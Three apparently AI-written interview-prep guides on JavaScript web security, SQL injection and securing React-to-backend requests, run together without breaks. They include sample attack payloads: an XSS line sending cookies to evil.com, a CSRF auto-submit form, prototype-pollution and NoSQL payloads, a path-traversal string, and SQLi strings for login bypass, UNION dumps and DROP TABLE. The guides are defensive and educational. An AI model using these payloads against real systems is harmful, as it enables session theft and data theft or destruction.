Excellent topic, Surya — this is **senior backend + frontend + security interview gold**. I’ll cover **major JavaScript security attacks**, how they **work internally**, **real examples**, and **production-grade defenses** (browser + Node.js).
---
# Security Attacks in JavaScript — Deep, Practical Guide
---
## Big Picture
JavaScript security attacks usually target:
* **Browser runtime (frontend)*** **API layer (Node.js backend)*** **Session/authentication flow*** **Data transport**
Think in 4 layers:
```textUser Input → Browser JS → Network → Server JS → Database```
Attacks try to **inject, hijack, leak, or overload** at one of these layers.
---
# XSS — Cross-Site Scripting ( Most Common)
## What It Is
> Attacker injects **malicious JavaScript** into your page, which runs in another user’s browser.
---
## Types
### 1. Stored XSS
Malicious script saved in DB and served to users.
```html<script>fetch("https://evil.com/steal?c="+document.cookie)</script>```
### 2. Reflected XSS
Script comes from URL/query params.
```urlhttps://site.com?q=<script>alert(1)</script>```
### 3. DOM-based XSS
JS modifies DOM unsafely.
```jselement.innerHTML = location.hash;```
---
## Impact
* Steal cookies/session tokens* Keylogging* Account takeover* Fake UI
---
## Defense
### Frontend
* Never use `innerHTML` with user input* Use `.textContent`* Escape output* CSP headers
### Backend
* Sanitize inputs* Set cookies as:
```httpHttpOnly; Secure; SameSite=Strict```
---
# CSRF — Cross-Site Request Forgery
## What It Is
> Attacker tricks browser into making a request **as a logged-in user**
---
## Example
User is logged into bank.comVisits evil.com → hidden form submits:
```html<form action="https://bank.com/transfer" method="POST">  <input name="amount" value="10000"></form><script>document.forms[0].submit()</script>```
Browser includes cookies → money transferred
---
## Defense
* CSRF tokens* `SameSite=Strict` cookies* Verify `Origin` / `Referer`* Use JWT in headers instead of cookies
---
# CORS Exploitation (Misconfiguration)
## What It Is
Bad CORS headers allow malicious sites to **read your API responses**
---
## Dangerous Config
```httpAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: true```
This is **illegal and insecure**
---
## Defense
* Allow specific origins only* Never use `*` with credentials* Validate preflight headers
---
# Prototype Pollution (Node.js Critical)
## What It Is
Attacker modifies JS object prototype globally.
---
## Example
```json{  "__proto__": {    "isAdmin": true  }}```
Now:
```jsuser.isAdmin === true```
---
## Impact
* Auth bypass* Config corruption* App crashes
---
## Defense
* Use `Object.create(null)` for trusted objects* Sanitize JSON input* Use `lodash` patched versions* Block `__proto__`, `constructor`, `prototype` keys
---
# Injection Attacks (JS Flavor)
---
## NoSQL Injection (MongoDB)
```jsUser.find({ email: req.body.email });```
Attacker sends:
```json{ "$ne": null }```
Now query matches everyone
---
## Defense
* Validate schema* Use ORM query builders* Never trust raw JSON
---
# Open Redirect
## What It Is
Attacker tricks user into trusting your site but redirects them to a phishing page.
```jsres.redirect(req.query.url);```
---
## Defense
* Allow only whitelisted domains* Reject full URLs, only relative paths
---
# Insecure JWT Handling
## Attacks
* Storing JWT in `localStorage` → XSS can steal it* Using weak secrets* No expiration* Accepting `alg=none`
---
## Defense
* Store tokens in **HttpOnly cookies*** Use strong secrets / RS256* Validate issuer, audience, expiry
---
# Clickjacking
## What It Is
Your site is embedded in an invisible iframe to trick users into clicking hidden buttons.
---
## Defense
Headers:
```httpX-Frame-Options: DENYContent-Security-Policy: frame-ancestors 'none'```
---
# Supply Chain Attacks (NPM Risk)
## What It Is
Malicious dependency steals env vars, tokens, secrets.
---
## Famous Attacks
* `event-stream`* `ua-parser-js`
---
## Defense
* `npm audit`* Lockfiles* Use `pnpm`* Review package maintainers* Run Snyk / Dependabot
---
# DoS via Event Loop Blocking (Node.js)
## Attack
Send heavy CPU request:
* Huge JSON* Regex bomb* Large file parsing
Node blocks → all users affected
---
## Defense
* Rate limiting* Payload size limits* Worker threads* Timeout middleware
---
# Session Fixation / Hijacking
## What It Is
Attacker sets session ID before login.
---
## Defense
* Regenerate session on login* Secure cookies* HTTPS only
---
# Path Traversal
## Example
```jsfs.readFile(`/files/${req.query.file}`);```
Attacker:
```text../../etc/passwd```
---
## Defense
* Normalize paths* Whitelist directories
---
# Eval / Code Injection
## Dangerous
```jseval(req.body.code);new Function(req.body.code);```
---
## Defense
Never use `eval` with user input. Ever.
---
# Frontend-Specific Attacks
| Attack               | Description       | Defense         || -------------------- | ----------------- | --------------- || XSS                  | JS injection      | CSP, sanitize   || Clickjacking         | Hidden iframe     | X-Frame-Options || DOM Clobbering       | Override DOM refs | Safe selectors  || Malicious extensions | Inject scripts    | CSP             |
---
# Backend-Specific Attacks (Node.js)
| Attack              | Defense                     || ------------------- | --------------------------- || Prototype Pollution | Input sanitization          || NoSQL Injection     | Validation                  || ReDoS               | Regex limits                || Command Injection   | Never use `exec` with input |
---
# Production Security Checklist (JS Apps)
---
## Browser
* CSP headers* HttpOnly cookies* Escape output* Avoid inline scripts
## Backend
* Helmet.js* Rate limiting* Input validation (Zod/Joi)* Auth middleware* Dependency scanning
## Network
* HTTPS only* HSTS* WAF
---
# Senior Interview One-Liner
> "In JavaScript systems, the most critical attacks are XSS and CSRF on the frontend, and prototype pollution, injection, and event-loop blocking on the backend. I mitigate them using strict input validation, CSP and secure cookies, proper CORS configuration, dependency scanning, rate limiting, and isolating CPU-heavy work into worker threads."
---
# Memory Trick (OWASP JS Focus)
> **XSS → CSRF → CORS → PROTO → INJECT → JWT → DOS → SUPPLY**
---
# Want This as a **Security Playbook PDF + OWASP Top 10 Mapping + Express/NestJS Hardened Boilerplate + Interview Q&A Set**?
I can package this into a **Senior JS Security Kit** for your Dubai/Qatar prep.Great — **SQL Injection (SQLi)** is one of the **most critical backend security topics** and a *must-know* for senior JS/Node + database interviews. I’ll cover **what it is, how it works internally, types, real examples, impact, and production-grade defenses**.
---
# SQL Injection — In-Depth, Practical Guide
---
## What Is SQL Injection?
> **SQL Injection** is a vulnerability where an attacker injects **malicious SQL code into user input**, causing the database to execute unintended queries.
This happens when your app **builds SQL queries by concatenating strings instead of using parameters**.
---
## How It Works (Internals)
### Vulnerable Flow
```textUser Input → App Builds SQL String → DB Executes It```
### Example Code (Bad)
```jsconst query = `  SELECT * FROM users  WHERE email = '${req.body.email}'  AND password = '${req.body.password}'`;```
### Attacker Input
```textemail: admin@example.compassword: ' OR '1'='1```
### Final SQL Sent to DB
```sqlSELECT * FROM usersWHERE email = 'admin@example.com'AND password = '' OR '1'='1'```
`'1'='1'` is always true → **login bypass**
---
# Types of SQL Injection
---
## 1. In-Band SQLi (Classic)
Attacker gets results directly in the response.
### Example
```urlGET /users?id=1 OR 1=1```
SQL:
```sqlSELECT * FROM users WHERE id = 1 OR 1=1;```
Returns **all users**
---
## 2. Error-Based SQLi
Attacker forces DB errors to reveal schema info.
### Example
```sql' AND extractvalue(1, concat(0x7e, database()))--```
DB error reveals database name.
---
## 3. Union-Based SQLi
Attacker merges their query with yours.
```sql' UNION SELECT username, password FROM users--```
---
## 4. Blind SQL Injection
No output — attacker infers data via behavior.
### Boolean-Based
```sql' AND 1=1--   (page loads)' AND 1=2--   (page fails)```
### Time-Based
```sql' AND IF(1=1, SLEEP(5), 0)--```
If response delays → condition true.
---
## 5. Out-of-Band SQLi (Advanced)
DB sends data externally (DNS/HTTP request)
* Rare but powerful* Used when responses are blocked
---
# Impact (Why This Is Dangerous)
| Impact             | Result               || ------------------ | -------------------- || Auth bypass        | Login as admin       || Data leak          | User data, passwords || Data loss          | Drop tables          || Full takeover      | RCE via DB features  || Compliance failure | GDPR/PCI issues      |
---
# Real Attack Examples
---
## Login Bypass
```textUsername: adminPassword: ' OR '1'='1' --```
---
## Drop Table
```text'; DROP TABLE users; --```
---
## Dump DB
```text' UNION SELECT table_name, column_name FROM information_schema.columns --```
---
# SQL Injection in Node.js (JS Context)
---
## Vulnerable Example
```jsapp.post("/login", async (req, res) => {  const { email, password } = req.body;
  const sql = `    SELECT * FROM users    WHERE email = '${email}'    AND password = '${password}'  `;
  const result = await db.query(sql);  res.json(result);});```
---
## Safe Example (Parameterized Query)
```jsconst sql = `  SELECT * FROM users  WHERE email = $1  AND password = $2`;const result = await db.query(sql, [email, password]);```
---
# Prevention — Production-Grade Defenses
---
## 1. Parameterized Queries (Best Defense)
Never concatenate user input into SQL.
### MySQL
```jsdb.execute(  "SELECT * FROM users WHERE email = ? AND password = ?",  [email, password]);```
### PostgreSQL
```jsdb.query(  "SELECT * FROM users WHERE email = $1 AND password = $2",  [email, password]);```
---
## 2. ORM / Query Builders
Use:
* Sequelize* Prisma* TypeORM* Knex
They **auto-parameterize queries**
---
## 3. Input Validation
Use schema validation:
* Zod* Joi* Yup
```jsemail: z.string().email()```
---
## 4. Least Privilege DB Users
Your app user should NOT have:
* `DROP`* `ALTER`* `SUPER`
---
## 5. Escape Is NOT Enough
Escaping helps but **does not fully prevent SQLi**Always parameterize.
---
## 6. Stored Procedures (Partial Defense)
Safe if they use parameters internally.
---
## 7. WAF (Web Application Firewall)
Block known SQLi patterns at network level.
---
# Detection & Testing
---
## Tools
* **sqlmap*** **OWASP ZAP*** **Burp Suite**
---
## Manual Test
Try:
```text' OR '1'='1'--";--```
If app behaves oddly → likely vulnerable.
---
# Special Cases
---
## SQL Injection via ORDER BY
```jsdb.query(`SELECT * FROM users ORDER BY ${req.query.sort}`);```
Attack:
```textsort = email; DROP TABLE users;```
### Fix
Whitelist columns:
```jsconst allowed = ["email", "created_at"];if (!allowed.includes(sort)) throw Error("Invalid");```
---
## SQL Injection in LIMIT/OFFSET
Parameters usually don’t work here — validate as numbers.
---
# Interview Traps
| Claim                      | Truth                            || -------------------------- | -------------------------------- || "I escape inputs"          | Not enough                     || "I use ORM so safe"        | Only if you avoid raw queries || "Prepared statements slow" | Negligible                     |
---
# Security Checklist (Node.js + SQL)
 Use parameterized queries Validate inputs Restrict DB permissions No raw SQL from user input Enable DB query logging Use HTTPS Monitor anomalies Run ZAP/sqlmap in CI
---
# Senior Interview One-Liner
> "SQL Injection happens when user input is concatenated into SQL strings, allowing attackers to alter query logic. I prevent it using parameterized queries or ORMs, strict input validation, least-privilege database users, and WAF rules, and I test with tools like sqlmap and OWASP ZAP."
---
# Memory Trick
> **Never build SQL with `+` and user input. Always use `?` or `$1`.**
---
If you want, I can give you **10 real-world SQLi interview scenarios + vulnerable code + secure fixes** — great for L2/L3 backend rounds.In React (browser), you **can’t make data “secret” just by sending it**—the browser is controlled by the user. Security comes from **how you authenticate, protect transport, validate input, and authorize on the backend**. Here’s the correct, production way.
---
## 1) Always use HTTPS (TLS)
**Frontend → backend must be HTTPS** so data is encrypted in transit.
* Also enable **HSTS** on backend so browsers always use HTTPS.
---
## 2) Authenticate correctly (don’t trust the client)
### Best options
**A) HttpOnly cookie session (recommended for web apps)**
* Login sets a cookie: `HttpOnly; Secure; SameSite=Lax/Strict`* React cannot read it (protects against token theft via XSS)* Browser sends it automatically to your API
**B) Bearer token in Authorization header (common for APIs)**
* `Authorization: Bearer <access_token>`* **Avoid storing tokens in `localStorage`** (XSS can steal)* Prefer **in-memory** storage + refresh tokens via HttpOnly cookies if possible
---
## 3) Protect against CSRF (if you use cookies)
If auth uses cookies, you must handle CSRF:
* `SameSite=Lax/Strict` (helps a lot)* Add **CSRF token** for state-changing requests (POST/PUT/PATCH/DELETE)* Validate `Origin` header on backend
---
## 4) Lock down CORS properly
CORS is a browser protection; configure it tightly:
* Allow only your frontend origin (not `*`)* If using cookies: `credentials: true` and **no wildcard origin*** Allow only required headers/methods
---
## 5) Validate + sanitize on the backend (client input is untrusted)
Even if React validates, attacker can bypass it.Backend must enforce:
* Schema validation (Zod/Joi)* Type checks, length limits, allowed values* Sanitization/escaping (where needed)* Use parameterized queries to avoid SQL injection
---
## 6) Authorization (RBAC/ABAC) on the backend
React can hide buttons, but that’s not security.Backend must check:
* User identity (token/cookie)* Roles/permissions per endpoint (RBAC)
---
## 7) Don’t send sensitive data from React unless necessary
* Never send secrets like DB passwords, API keys, private tokens* For payments, use **provider tokenization** (Stripe/Razorpay) so card data never hits your backend directly
---
## 8) Add rate limiting + abuse protection
Protect login and sensitive endpoints:
* Rate limit (IP + user)* Captcha for suspicious patterns* Account lock / progressive delays
---
## 9) Use secure headers + CSP (reduce XSS risk)
Since XSS breaks many models:
* Content Security Policy (CSP)* `X-Content-Type-Options: nosniff`* `X-Frame-Options` / `frame-ancestors`* `Referrer-Policy`
---
# Recommended “Secure React → Backend” Patterns
## Pattern 1: Cookie-based session (best for web)
React fetch:
```jsfetch("https://api.yoursite.com/profile", {  method: "GET",  credentials: "include", // send HttpOnly cookie});```
Backend sets cookie:
* `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/`
Add CSRF token for POST/PUT/DELETE.
---
## Pattern 2: Access token in header (for SPA + APIs)
```jsfetch("https://api.yoursite.com/orders", {  method: "POST",  headers: {    "Content-Type": "application/json",    "Authorization": `Bearer ${accessToken}`,  },  body: JSON.stringify(payload),});```
Store access token **in memory**; refresh via HttpOnly cookie if possible.
---
# What NOT to do
 Store JWT in `localStorage` if you care about XSS Assume React validation is enough CORS `*` with credentials Put secrets in `.env` on frontend (they become public in the bundle)
---
# Interview-ready answer (short)
> “From React, I secure data-in-transit using HTTPS, authenticate using HttpOnly secure cookies or Authorization bearer tokens, configure strict CORS, and protect cookie-based flows with CSRF tokens and SameSite cookies. On the backend I enforce schema validation, parameterized queries, and RBAC authorization. The client is never trusted—security is enforced server-side.”
If you tell me your setup (JWT? cookies? Azure AD? etc.), I can suggest the **best exact architecture** and headers for your case.